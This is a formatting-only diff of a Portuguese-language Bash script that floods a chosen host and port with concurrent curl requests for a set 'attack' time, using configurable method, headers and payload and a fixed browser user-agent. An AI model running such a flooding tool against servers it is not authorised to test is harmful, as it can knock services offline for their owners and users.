@@ -54,9 +54,9 @@ porta_alvo="80"
 threads_atual=1
 tempo_ataque=35
 temp_file_fa=$(mktemp)
-echo 0 > $temp_file_fa # inicializando temp fa
+echo 0 >$temp_file_fa # inicializando temp fa
 temp_file_su=$(mktemp)
-echo 0 > $temp_file_su # inicializa tem su
+echo 0 >$temp_file_su # inicializa tem su
 tempo_espera=1
 max_req=100
 method="GET"
@@ -65,7 +65,7 @@ payload=""
 ABORT=0
 
 # limpa arquivos temporarios
-limpa_tmp(){
+limpa_tmp() {
     echo Limpando arquivos temporários
     rm -f $temp_file_fa $temp_file_su
     [[ $? -eq "0" ]] && return 0 || return 1
@@ -128,27 +128,27 @@ requisitar() {
     local port=$2
     local flags="-X ${method} ${headers[@]}"
     local lock="$(mktemp).lock"
-    
-    for ((i=0; i < "$max_req"; i++)); do
-	[[ SECONDS -ge $(($tempo_ataque - $tempo_espera )) ]] && return 0
-    (
-    flock -e 200 || exit 1
-    local fail=$(cat $temp_file_fa)
-    local sucess=$(cat $temp_file_su)
 
-    if [[ $method == "POST" || $method == "PUT" ]]; then
-	flags="-X ${flags} -d ${payload}"
-    fi
+    for ((i = 0; i < "$max_req"; i++)); do
+        [[ SECONDS -ge $(($tempo_ataque - $tempo_espera)) ]] && return 0
+        (
+            flock -e 200 || exit 1
+            local fail=$(cat $temp_file_fa)
+            local sucess=$(cat $temp_file_su)
 
-    curl ${flags//=/:} --silent --max-time "$tempo_espera" -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}" &>/dev/null
-    if [[ "$?" -eq "0" ]]; then
-	((sucess++))
-	echo $sucess >$temp_file_su
-    else
-	((fail++))
-	echo $fail >$temp_file_fa
-    fi
-    ) 200>"$lock"
+            if [[ $method == "POST" || $method == "PUT" ]]; then
+                flags="-X ${flags} -d ${payload}"
+            fi
+
+            curl ${flags//=/:} --silent --max-time "$tempo_espera" -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}" &>/dev/null
+            if [[ "$?" -eq "0" ]]; then
+                ((sucess++))
+                echo $sucess >$temp_file_su
+            else
+                ((fail++))
+                echo $fail >$temp_file_fa
+            fi
+        ) 200>"$lock"
     done
     rm -f "$lock"
 }
@@ -168,7 +168,7 @@ validar_host() {
     local host="$1"
 
     # Expressão regular para validar um nome de domínio (inclui subdomínios e domínios de TLD com mais de 3 letras)
-    if [[ $host =~ ^(https?:\/\/)?(([a-zA-Z0-9](-*[a-zA-Z0-9])*)\.)+[a-zA-Z]{2,}(:\d+)?(\/[^\s]*)?$  ]]; then
+    if [[ $host =~ ^(https?:\/\/)?(([a-zA-Z0-9](-*[a-zA-Z0-9])*)\.)+[a-zA-Z]{2,}(:\d+)?(\/[^\s]*)?$ ]]; then
         return 0
     # Verifica se é um IP válido
     elif validar_ip "$host"; then
@@ -185,8 +185,8 @@ progress_bar() {
     local total=$3       # Valor total a ser atingido
 
     # Calcula a porcentagem de progresso
-    local progress=$(( current * 100 / total ))
-    
+    local progress=$((current * 100 / total))
+
     # Calcula a quantidade de "#" (completado) e "-" (restante)
     local done=$((progress * width / 100))
     local left=$((width - done))
@@ -197,8 +197,8 @@ progress_bar() {
 
     # Gera a barra de progresso com tamanho fixo
     printf "["
-    printf "${YELLOW}%0.s\u2588" $(seq 1 $done)    # Imprime os símbolos "#" (completado)
-    printf "%0.s " $(seq 1 $left)    # Imprime os símbolos "-" (restante)
+    printf "${YELLOW}%0.s\u2588" $(seq 1 $done)                       # Imprime os símbolos "#" (completado)
+    printf "%0.s " $(seq 1 $left)                                     # Imprime os símbolos "-" (restante)
     printf "${RESET}] %03d%% (%03d/%03d)\r" $progress $current $total # imprime a barra de progresso.
 }
 
@@ -207,38 +207,38 @@ menu_check() {
 
     while [[ -n $1 ]]; do
         case "$1" in
-	-r|--req)
-	    shift
-	    [[ "$1" -ge 1 ]] && max_req="$1"
-	    ;;
-	-m|--method)
-	    shift
-	    [[ -n "$1" ]] && method="$1"
-	    ;;
-	-H|--headers)
-	    shift
-	    [[ -n "$1" ]] && headers+=("-H" "$1")
-	    ;;
-	-P|--payload)
-	    shift
-	    [[ -n "$1" ]] && payload="$1"
-	    ;;
-	-w|--wait)
-	    shift
-	    [[ "$1" -ge 0 ]] && tempo_espera="$1"
-	    ;;
-	-p|--port)
-	    shift
-	    [[ "$1" -ge 1  ]] && porta_alvo="$1" 
-	;;
-	-t|--time)
-	    shift
-	    [[ "$1" -gt 0 ]] && tempo_ataque="$1"
-	    ;;
-	-c|--childs)
-	    shift
-	    [[ "$1" -gt 0 ]] && threads_atual="$1"
-	    ;;
+        -r | --req)
+            shift
+            [[ "$1" -ge 1 ]] && max_req="$1"
+            ;;
+        -m | --method)
+            shift
+            [[ -n "$1" ]] && method="$1"
+            ;;
+        -H | --headers)
+            shift
+            [[ -n "$1" ]] && headers+=("-H" "$1")
+            ;;
+        -P | --payload)
+            shift
+            [[ -n "$1" ]] && payload="$1"
+            ;;
+        -w | --wait)
+            shift
+            [[ "$1" -ge 0 ]] && tempo_espera="$1"
+            ;;
+        -p | --port)
+            shift
+            [[ "$1" -ge 1 ]] && porta_alvo="$1"
+            ;;
+        -t | --time)
+            shift
+            [[ "$1" -gt 0 ]] && tempo_ataque="$1"
+            ;;
+        -c | --childs)
+            shift
+            [[ "$1" -gt 0 ]] && threads_atual="$1"
+            ;;
         -host)
             shift
             if validar_host "$1"; then
@@ -275,29 +275,29 @@ menu_check() {
     return 0
 }
 
-ataque(){
+ataque() {
     local controle=0 # Variavel de controle.
     local host="$1"
     local port="$2"
     local t_ataque="$3"
     local t_final="$((SECONDS + t_ataque - $tempo_espera))"
 
-    while [[ SECONDS -lt t_final  ]]; do 
-	[[ $ABORT -eq 1 ]] && {
-	    echo Saida forçada pelo usiário!
-	    break
-	    limpa_tmp
-	} # se 1 loop quebrado.
+    while [[ SECONDS -lt t_final ]]; do
+        [[ $ABORT -eq 1 ]] && {
+            echo Saida forçada pelo usiário!
+            break
+            limpa_tmp
+        } # se 1 loop quebrado.
 
-       progress_bar $SECONDS 30 $t_final
-       requisitar $host $port & 
+        progress_bar $SECONDS 30 $t_final
+        requisitar $host $port &
 
-       ((controle++))
+        ((controle++))
 
-       if [[ "$controle" -ge "$threads_atual" ]]; then
-          wait -n # Espera até que uma termine
-	  ((controle--))
-       fi
+        if [[ "$controle" -ge "$threads_atual" ]]; then
+            wait -n # Espera até que uma termine
+            ((controle--))
+        fi
     done
     wait # Aguarda que todod terminem.
 }
@@ -330,7 +330,7 @@ banner_fn() {
     echo # Adiciona uma linha em branco
 }
 
-gerar_relatorio(){
+gerar_relatorio() {
     local RED="\033[1;31m"
     local GREEN="\033[1;32m"
     local YELLOW="\033[1;33m"
@@ -366,7 +366,7 @@ gerar_relatorio(){
     echo -e "${CYAN}======================================${RST}"
 }
 
-sg_abort(){
+sg_abort() {
     ABORT=1
 }
 
@@ -374,7 +374,7 @@ trap sg_abort SIGINT SIGTERM SIGABRT SIGSTOP
 
 main() {
     banner_fn
-    menu_check "$@" || exit 1 
+    menu_check "$@" || exit 1
     ataque $host_alvo $porta_alvo "$tempo_ataque"
     gerar_relatorio
     limpa_tmp
@@ -382,4 +382,3 @@ main() {
 }
 
 main "$@" && echo encerrando execucao! | figlet -ctf miniwi | lolcat
-
